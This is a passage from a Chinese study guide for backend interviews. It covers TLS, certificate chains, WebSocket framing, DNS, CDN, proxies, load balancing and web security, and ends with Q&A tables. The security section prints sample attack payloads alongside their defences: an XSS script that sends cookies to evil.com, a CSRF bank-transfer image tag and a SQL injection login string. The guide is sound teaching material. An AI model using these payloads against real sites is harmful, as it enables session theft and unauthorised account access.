  │   (支持的加密套件、随机数 Client Random)     │
  │                                            │
  │◀── ServerHello ───────────────────────────│
  │   (选定的加密套件、随机数 Server Random)     │
  │◀── Certificate ───────────────────────────│
  │   (服务端证书，含公钥)                       │
  │◀── ServerKeyExchange (ECDHE) ────────────│
  │   (DH 参数)                                │
  │◀── ServerHelloDone ──────────────────────│
  │                                            │
  │  验证证书合法性                              │
  │                                            │
  │── ClientKeyExchange ─────────────────────▶│
  │   (DH 参数 / RSA 加密的预主密钥)             │
  │── ChangeCipherSpec ──────────────────────▶│
  │── Finished (加密) ───────────────────────▶│
  │                                            │
  │◀── ChangeCipherSpec ─────────────────────│
  │◀── Finished (加密) ──────────────────────│
  │                                            │
  │  ========= 加密通信开始 =========          │
```

**共 2-RTT**（TCP 握手 1-RTT + TLS 握手 2-RTT = 共 3-RTT）

### ECDHE vs RSA 密钥交换

| | RSA | ECDHE |
|--|-----|-------|
| 前向安全 | 否（私钥泄露可解密历史数据） | 是（每次会话独立密钥） |
| 性能 | 中 | 好 |
| 现状 | TLS 1.3 已移除 | 推荐 |

---

## 4.3 TLS 1.3

```
改进:
1. 握手只需 1-RTT（TLS 1.2 需要 2-RTT）
2. 支持 0-RTT 恢复（对已知服务器）
3. 移除不安全的算法（RSA 密钥交换、SHA-1、DES、RC4）
4. 简化密码套件（只剩 5 个）

TLS 1.3 握手 (1-RTT):
客户端                                      服务端
  │                                            │
  │── ClientHello + KeyShare ────────────────▶│
  │   (一步到位: 支持的套件 + DH 公钥)          │
  │                                            │
  │◀── ServerHello + KeyShare ───────────────│
  │◀── Certificate + Finished ───────────────│
  │                                            │
  │── Finished ─────────────────────────────▶│
  │                                            │
  │  ========= 加密通信开始 =========          │

0-RTT:
  第二次连接时，客户端用上次的密钥直接发加密数据
  风险: 重放攻击（0-RTT 数据不保证不被重放）
```

---

## 4.4 证书链

```
证书链验证:

  根证书 (Root CA)
  │  预装在 OS/浏览器中
  │  自签名
  ▼
  中间证书 (Intermediate CA)
  │  由根 CA 签发
  ▼
  服务器证书 (Server Certificate)
     由中间 CA 签发
     包含: 域名、公钥、有效期、签名

验证过程:
1. 浏览器收到服务器证书
2. 用中间 CA 的公钥验证服务器证书的签名
3. 用根 CA 的公钥验证中间 CA 证书的签名
4. 根 CA 预装在系统中，可信

为什么不直接用根 CA 签发服务器证书？
  根 CA 的私钥极其重要，离线存储
  中间 CA 可以撤销，根 CA 不能撤销
```

---

# 五、WebSocket 协议深度

---

## 5.1 为什么需要 WebSocket

```
HTTP 的问题: 请求-响应模式，服务端不能主动推送

方案对比:

1. 短轮询 (Short Polling):
   客户端每隔 N 秒请求一次
   缺点: 延迟高、浪费带宽、服务端压力大

2. 长轮询 (Long Polling):
   客户端请求 → 服务端 hold 住，有数据才返回 → 客户端立即再请求
   缺点: 仍然是半双工，每次都要 HTTP 头部开销

3. SSE (Server-Sent Events):
   服务端单向推送，基于 HTTP 长连接
   Content-Type: text/event-stream
   缺点: 单向（只能服务端推客户端），不支持二进制

4. WebSocket:
   全双工、双向通信、基于 TCP、低延迟、低开销
   适用: 聊天、实时推送、协作编辑、游戏、股票行情
```

---

## 5.2 WebSocket 握手

```
客户端发起 HTTP Upgrade 请求:

GET /chat HTTP/1.1
Host: server.example.com
Upgrade: websocket                          ← 协议升级
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ== ← 随机 Base64 字符串
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat, superchat     ← 子协议（可选）

服务端回复:

HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=  ← 验证 key
Sec-WebSocket-Protocol: chat                           ← 选定的子协议
```

### Accept Key 计算

```
Sec-WebSocket-Accept = Base64(SHA1(Sec-WebSocket-Key + GUID))

GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"（固定值，RFC 6455 规定）

示例:
  Key = "dGhlIHNhbXBsZSBub25jZQ=="
  Combined = "dGhlIHNhbXBsZSBub25jZQ==" + "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
  SHA1 = b37a4f2cc0624f1690f64606cf385945b2bec4ea
  Base64 = "s3pPLMBiTxaQ9kYGzzhZRbK+xOo="

目的: 不是为了安全，是为了确认服务端理解 WebSocket 协议
```

---

## 5.3 WebSocket 帧格式

```
  0                   1                   2                   3
  0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
 +-+-+-+-+-------+-+-------------+-------------------------------+
 |F|R|R|R| opcode|M| Payload len |    Extended payload length     |
 |I|S|S|S|  (4)  |A|     (7)     |             (16/64)            |
 |N|V|V|V|       |S|             |   (if payload len==126/127)    |
 | |1|2|3|       |K|             |                                |
 +-+-+-+-+-------+-+-------------+ - - - - - - - - - - - - - - - +
 |     Extended payload length continued, if payload len == 127   |
 + - - - - - - - - - - - - - - - +-------------------------------+
 |                               | Masking-key, if MASK set to 1  |
 +-------------------------------+-------------------------------+
 | Masking-key (continued)       |          Payload Data          |
 +-------------------------------- - - - - - - - - - - - - - - - +
 :                     Payload Data continued ...                 :
 +---------------------------------------------------------------+
```

| 字段 | 说明 |
|------|------|
| FIN | 1 bit，是否是最后一帧（1=最后） |
| opcode | 4 bit，帧类型 |
| MASK | 1 bit，是否掩码（客户端→服务端必须掩码） |
| Payload length | 7 bit（0-125 直接表示；126 用后续 2 字节；127 用后续 8 字节） |
| Masking-key | 4 字节，掩码密钥 |

### opcode 类型

| opcode | 类型 | 说明 |
|--------|------|------|
| 0x0 | Continuation | 延续帧（分片） |
| 0x1 | Text | 文本帧（UTF-8） |
| 0x2 | Binary | 二进制帧 |
| 0x8 | Close | 关闭连接 |
| 0x9 | Ping | 心跳请求 |
| 0xA | Pong | 心跳响应 |

### 掩码机制

```
客户端 → 服务端: 必须掩码
服务端 → 客户端: 不掩码

掩码算法:
  masked[i] = payload[i] XOR mask_key[i % 4]

为什么需要掩码？
  防止缓存污染攻击
  中间代理可能把 WebSocket 帧误认为 HTTP 请求
  掩码使帧内容不可预测，代理不会缓存

注意: 掩码不是加密！只是防代理缓存攻击
```

---

## 5.4 WebSocket 心跳

```
Ping/Pong 机制:

  客户端或服务端 ── Ping (opcode=0x9) ──▶ 对端
  对端 ──── Pong (opcode=0xA) ──▶ 发起方

  超过 N 秒没收到 Pong → 认为连接断开

典型配置:
  心跳间隔: 30 秒
  超时阈值: 3 次未回复 → 断开

应用层心跳 vs WebSocket Ping/Pong:
  Ping/Pong: 协议级，透明，轻量
  应用层: 可以携带业务数据（如在线状态）
  建议: 都用，Ping/Pong 检测连接，应用层传状态
```

---

## 5.5 WebSocket vs 其他方案

| 特性 | WebSocket | SSE | Long Polling | Short Polling |
|------|-----------|-----|-------------|---------------|
| 方向 | 全双工 | 服务端→客户端 | 服务端→客户端 | 客户端→服务端 |
| 协议 | ws:// / wss:// | HTTP | HTTP | HTTP |
| 实时性 | 极高 | 高 | 中 | 低 |
| 开销 | 低（2-14 字节帧头） | 中（HTTP 头） | 高（频繁建连） | 最高 |
| 二进制 | 支持 | 不支持 | 支持 | 支持 |
| 断线重连 | 需自己实现 | 浏览器自动 | 自然（新请求） | 自然 |
| 兼容性 | 广泛 | IE 不支持 | 广泛 | 广泛 |

---

# 六、DNS & 网络基础设施

---

## 6.1 DNS 解析流程

```
浏览器输入 www.example.com:

1. 浏览器缓存 → 有就直接用
2. OS 缓存 (/etc/hosts) → 有就直接用
3. 本地 DNS 服务器（递归查询）
     │
     ├── 缓存中有 → 直接返回
     │
     ├── 查询根 DNS 服务器 (.)
     │     └── 返回 .com 的 NS 服务器地址
     │
     ├── 查询 .com 顶级域 DNS 服务器
     │     └── 返回 example.com 的 NS 服务器地址
     │
     └── 查询 example.com 的权威 DNS 服务器
           └── 返回 www.example.com 的 IP 地址

4. 本地 DNS 缓存结果（TTL 时间内有效）
5. 返回给浏览器
```

### DNS 记录类型

| 类型 | 说明 | 示例 |
|------|------|------|
| A | IPv4 地址 | www.example.com → 93.184.216.34 |
| AAAA | IPv6 地址 | www.example.com → 2606:2800:220:1:... |
| CNAME | 别名 | blog.example.com → example.github.io |
| MX | 邮件服务器 | example.com → mail.example.com |
| NS | 域名服务器 | example.com → ns1.example.com |
| TXT | 文本记录 | SPF、DKIM 邮件验证 |

---

## 6.2 CDN 原理

```
没有 CDN:
  用户(北京) ──────────────────────▶ 源站(美国)  延迟高

有 CDN:
  用户(北京) ──▶ CDN 节点(北京)  延迟低
                    │
              缓存命中？
              │       │
             是       否
              │       │
          直接返回   回源请求
                      │
                  源站(美国)
                      │
                  返回 + 缓存

DNS 实现:
  www.example.com CNAME cdn.example.com
  CDN 的 DNS 根据用户 IP 返回最近的 CDN 节点 IP
```

---

## 6.3 正向代理 & 反向代理

```
正向代理（代理客户端）:
  客户端 ──▶ 正向代理 ──▶ 目标服务器
  客户端知道代理的存在
  用途: 翻墙、缓存、访问控制

反向代理（代理服务端）:
  客户端 ──▶ 反向代理(Nginx) ──▶ 后端服务器群
  客户端不知道真实服务器
  用途: 负载均衡、SSL 终止、缓存、安全防护

区别:
  正向代理: 客户端配置，隐藏客户端
  反向代理: 服务端配置，隐藏服务端
```

---

## 6.4 负载均衡

```
四层负载均衡（传输层，TCP/UDP）:
  基于 IP + 端口转发
  不解析 HTTP 内容
  性能高、功能简单
  代表: LVS、F5

七层负载均衡（应用层，HTTP）:
  解析 HTTP 内容（URL、Header、Cookie）
  可以做更智能的路由
  性能稍低、功能丰富
  代表: Nginx、HAProxy

常见算法:
  轮询 (Round Robin)
  加权轮询 (Weighted RR)
  最少连接 (Least Connections)
  IP 哈希 (IP Hash) — 同一客户端总是同一后端
  一致性哈希 (Consistent Hash) — 分布式缓存
```

---

# 七、网络安全

---

## 7.1 XSS（跨站脚本攻击）

```
原理: 攻击者在网页中注入恶意脚本，窃取用户数据

类型:
1. 存储型 XSS: 恶意脚本存入数据库（如评论区注入 <script>）
2. 反射型 XSS: 恶意脚本在 URL 参数中（如搜索框）
3. DOM 型 XSS: 前端 JS 直接操作 DOM 导致

示例:
  评论内容: <script>fetch('evil.com?cookie='+document.cookie)</script>
  其他用户浏览该评论 → Cookie 被盗

防御:
  输入过滤: 转义 HTML 特殊字符 (< > & " ')
  输出编码: 根据上下文编码（HTML/JS/URL/CSS）
  CSP (Content-Security-Policy): 限制脚本来源
  HttpOnly Cookie: JS 无法读取 Cookie
```

## 7.2 CSRF（跨站请求伪造）

```
原理: 利用用户已登录的身份，伪造请求

攻击流程:
  1. 用户登录 bank.com（Cookie 有效）
  2. 用户访问 evil.com
  3. evil.com 的页面包含:
     <img src="https://bank.com/transfer?to=attacker&amount=10000">
  4. 浏览器自动携带 bank.com 的 Cookie 发请求
  5. bank.com 认为是用户操作 → 转账成功

防御:
  CSRF Token: 表单中嵌入随机 token，服务端验证
  SameSite Cookie: SameSite=Strict 或 Lax
  Referer/Origin 检查: 验证请求来源
  双重 Cookie: 请求头和请求体都带 token
```

## 7.3 SQL 注入

```
原理: 用户输入被拼接到 SQL 语句中

示例:
  登录表单: username = admin' OR '1'='1
  拼接后: SELECT * FROM users WHERE username='admin' OR '1'='1'
  → 查询所有用户，登录成功

防御:
  参数化查询（预编译语句）:
    PreparedStatement: SELECT * FROM users WHERE username = ?
  ORM 框架: 自动参数化
  输入验证: 白名单校验
  最小权限: 数据库账号只给必要权限
```

## 7.4 CORS（跨域资源共享）

```
同源策略: 协议 + 域名 + 端口 都相同才是同源
  http://a.com:80 ≠ https://a.com:443 (协议不同)
  http://a.com ≠ http://b.com (域名不同)
  http://a.com:80 ≠ http://a.com:8080 (端口不同)

CORS 流程:

简单请求（GET/POST，常见 Content-Type）:
  浏览器: Origin: http://a.com
  服务端: Access-Control-Allow-Origin: http://a.com
  → 浏览器放行

预检请求（非简单请求）:
  1. 浏览器先发 OPTIONS 请求（预检）:
     Origin: http://a.com
     Access-Control-Request-Method: PUT
     Access-Control-Request-Headers: X-Custom

  2. 服务端回复:
     Access-Control-Allow-Origin: http://a.com
     Access-Control-Allow-Methods: GET, POST, PUT
     Access-Control-Allow-Headers: X-Custom
     Access-Control-Max-Age: 86400 (预检结果缓存时间)

  3. 预检通过 → 发送实际请求

跨域携带 Cookie:
  客户端: fetch(url, { credentials: 'include' })
  服务端: Access-Control-Allow-Credentials: true
         Access-Control-Allow-Origin: http://a.com (不能是 *)
```

---

# 八、面试高频速查

---

## TCP 类

| 问题 | 关键答案 |
|------|---------|
| 三次握手流程？ | SYN → SYN+ACK → ACK |
| 为什么不是两次？ | 防止旧 SYN 延迟到达误建连接 |
| 为什么不是四次？ | 三次已够，第二步 SYN+ACK 合并 |
| 四次挥手流程？ | FIN → ACK → FIN → ACK |
| 为什么挥手要四次？ | 全双工，关闭是单向的，可能还有数据要发 |
| TIME_WAIT 作用？ | 确保最后 ACK 到达 + 让旧数据消失 |
| TIME_WAIT 过多怎么办？ | SO_REUSEADDR、tcp_tw_reuse、长连接 |
| CLOSE_WAIT 过多怎么办？ | 程序 bug，没有正确 close() |
| SYN Flood 防御？ | SYN Cookie、增大半连接队列 |
| 拥塞控制四个算法？ | 慢启动、拥塞避免、快速重传、快速恢复 |
| 流量控制 vs 拥塞控制？ | 流量控制对接收方；拥塞控制对网络 |
| 滑动窗口作用？ | 流量控制，接收方告知发送方可接收量 |
| TCP 怎么保证可靠？ | 序号、ACK、重传、校验和、流量控制、拥塞控制 |
| Nagle 算法是什么？ | 合并小包减少网络开销，TCP_NODELAY 禁用 |
| 粘包怎么解决？ | 长度前缀、分隔符、固定长度 |

## HTTP 类

| 问题 | 关键答案 |
|------|---------|
| GET vs POST？ | 语义不同（获取/提交）、幂等性、缓存、参数位置 |
| HTTP/1.1 vs HTTP/2？ | 多路复用、二进制帧、头部压缩、Server Push |
| HTTP/2 vs HTTP/3？ | HTTP/3 基于 QUIC(UDP)，无 TCP 队头阻塞，0-RTT |
| 常用状态码？ | 200/301/302/304/400/401/403/404/500/502/503 |
| 301 vs 302？ | 永久 vs 临时重定向，301 浏览器缓存 |
| Cookie vs Session？ | Cookie 在客户端，Session 在服务端，Session ID 通过 Cookie 传递 |
| Session vs Token？ | Session 有状态（服务端存储），Token 无状态（自包含） |
| 强缓存 vs 协商缓存？ | 强缓存不请求(Cache-Control)；协商缓存请求验证(ETag/304) |
| HTTP 队头阻塞？ | HTTP/1.1 Pipeline 响应必须按序；HTTP/2 在 TCP 层仍有 |
| HTTP Keep-Alive？ | 复用 TCP 连接，避免重复三次握手 |

## HTTPS/TLS 类

| 问题 | 关键答案 |
|------|---------|
| HTTPS 怎么工作？ | 非对称加密交换密钥 → 对称加密传数据 |
| TLS 握手过程？ | ClientHello → ServerHello+证书 → 密钥交换 → 加密通信 |
| TLS 1.2 vs 1.3？ | 1.3: 1-RTT(更快)、移除不安全算法、强制前向安全 |
| 对称 vs 非对称加密？ | 对称快但密钥分发难；非对称慢但安全 |
| 证书链怎么验证？ | 服务器证书 → 中间 CA 验签 → 根 CA 验签（根 CA 预装） |
| 什么是前向安全？ | 即使私钥泄露也无法解密历史数据（ECDHE 有，RSA 没有） |

## WebSocket 类

| 问题 | 关键答案 |
|------|---------|
| WebSocket vs HTTP？ | 全双工 vs 请求响应；WebSocket 通过 HTTP Upgrade 建立 |
| 握手流程？ | 客户端 HTTP Upgrade 请求 → 服务端 101 Switching Protocols |
| Sec-WebSocket-Accept 怎么算？ | Base64(SHA1(Key + GUID)) |
| 为什么客户端要掩码？ | 防止中间代理缓存污染攻击 |
| WebSocket vs SSE？ | WS 全双工+二进制；SSE 单向+文本+自动重连 |
| 心跳怎么做？ | Ping/Pong 控制帧 + 应用层心跳 |

## 网络安全类

| 问题 | 关键答案 |
|------|---------|
| XSS 是什么？怎么防？ | 注入恶意脚本；输入转义+CSP+HttpOnly |
| CSRF 是什么？怎么防？ | 伪造用户请求；CSRF Token+SameSite Cookie |
| SQL 注入怎么防？ | 参数化查询（预编译语句） |
| CORS 是什么？ | 跨域资源共享，浏览器同源策略的豁免机制 |
| 什么是同源策略？ | 协议+域名+端口相同才算同源 |

## 综合类

| 问题 | 关键答案 |
|------|---------|
| 输入 URL 到页面显示的全过程？ | DNS解析→TCP连接→TLS握手→HTTP请求→服务端处理→HTTP响应→渲染 |
| TCP 和 UDP 的区别？ | 面向连接/无连接、可靠/不可靠、字节流/数据报 |
| 为什么 DNS 用 UDP？ | 查询小且快，UDP 开销小（大响应会切 TCP） |
| CDN 原理？ | DNS 返回最近节点 IP → 就近缓存服务 |
| 正向代理 vs 反向代理？ | 正向代理客户端（隐藏客户端）；反向代理服务端（隐藏服务端） |
| 四层 vs 七层负载均衡？ | 四层基于 IP+端口(LVS)；七层基于 HTTP 内容(Nginx) |

---

> 本文档覆盖 TCP/UDP/HTTP/HTTPS/WebSocket/DNS/安全 全栈 Web 协议，面向后端开发面试。
> 最后更新：2026-04-09
